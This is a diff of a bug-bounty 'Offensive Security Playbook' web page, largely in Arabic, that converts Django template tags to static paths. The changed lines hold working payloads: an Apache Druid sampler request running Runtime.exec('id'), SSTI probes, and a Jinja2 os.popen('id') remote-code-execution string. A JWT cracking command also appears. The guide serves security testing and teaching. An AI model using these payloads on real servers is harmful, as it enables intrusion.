@@ -1,4 +1,4 @@
-{% load static %}
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,8 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="{% static 'main/css/style.css' %}">
-  <link rel="stylesheet" href="{% static 'main/css/methodology.css' %}">
+  <link rel="stylesheet" href="css/style.css?v=1100">
+  <link rel="stylesheet" href="css/methodology.css?v=1100">
 
   
 
@@ -1251,7 +1251,7 @@ https://cdn.target.com [301] → assets.cdn.net
             <div class="cmd-ui-top">POST /druid/indexer/v1/sampler HTTP/1.1
 Content-Type: application/json
 
-{"type":"index","spec":{"dataSchema":{"parser":{"parseSpec":{"format":"javascript","tsColName":"timestamp","timestampSpec":{"column":"timestamp","format":"auto"},"dimensionsSpec":{},"function":"function(){java.lang.Runtime.getRuntime().exec('id')}"{% templatetag closevariable %}{% templatetag closevariable %}}</div>
+{"type":"index","spec":{"dataSchema":{"parser":{"parseSpec":{"format":"javascript","tsColName":"timestamp","timestampSpec":{"column":"timestamp","format":"auto"},"dimensionsSpec":{},"function":"function(){java.lang.Runtime.getRuntime().exec('id')}"}}}}}</div>
           </div>
           <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$10,000</span></p>
         </div>
@@ -2044,7 +2044,7 @@ aws s3 ls</div>
           <p>تبدأ الثغرة عندما يتم دمج مدخلات المستخدم مباشرة داخل محرك القوالب (Template Engine) بدلاً من تمريرها كبيانات آمنة.</p>
           <p>لحقن العمليات الرياضية ورصد النتيجة:</p>
           <ul class="t-check-list">
-            <li>✔ حقن <code>${7*7}</code> أو <code>{% templatetag openvariable %}7*7{% templatetag closevariable %}</code> في المدخلات.</li>
+            <li>✔ حقن <code>${7*7}</code> أو <code>{{7*7}}</code> في المدخلات.</li>
             <li>✔ إذا عادت الاستجابة بالرقم <strong>49</strong>، فإن الخادم مصاب بـ SSTI مؤكدة.</li>
           </ul>
         </div>
@@ -2064,8 +2064,8 @@ aws s3 ls</div>
               <tr>
                 <td><strong>Jinja2 / Twig</strong></td>
                 <td>Python / PHP</td>
-                <td><code>{% templatetag openvariable %}7*7{% templatetag closevariable %}</code></td>
-                <td><code>{% templatetag openvariable %}self.__init__.__globals__.__specs__['os'].popen('id').read(){% templatetag closevariable %}</code></td>
+                <td><code>{{7*7}}</code></td>
+                <td><code>{{self.__init__.__globals__.__specs__['os'].popen('id').read()}}</code></td>
               </tr>
               <tr>
                 <td><strong>Thymeleaf</strong></td>
@@ -2487,9 +2487,9 @@ jwt_tool jwt_token.txt -C -d rockyou.txt</div>
             </div>
             <p>حمولة اختبارية للتحقق من معالجة السيرفر لقوالب بايثون.</p>
             <div class="cmd-ui-box">
-              <div class="cmd-ui-top">{% templatetag openvariable %}7*7{% templatetag closevariable %}</div>
+              <div class="cmd-ui-top">{{7*7}}</div>
               <div class="cmd-ui-bottom">
-                <button class="cmd-btn" onclick="copyText('{% templatetag openvariable %}7*7{% templatetag closevariable %}', this)">📋 Copy</button>
+                <button class="cmd-btn" onclick="copyText('{{7*7}}', this)">📋 Copy</button>
               </div>
             </div>
           </div>
@@ -2864,7 +2864,7 @@ Content-Type: application/json
     <button class="cmd-btn" onclick="closePopupModal()" style="margin-top:15px; border-color:#00ff66; color:#00ff66;">Close</button>
   </div>
 
-  <script src="{% static 'main/js/methodology.js' %}"></script>
+  <script src="js/methodology.js?v=1100"></script>
 
 </body>
 </html>
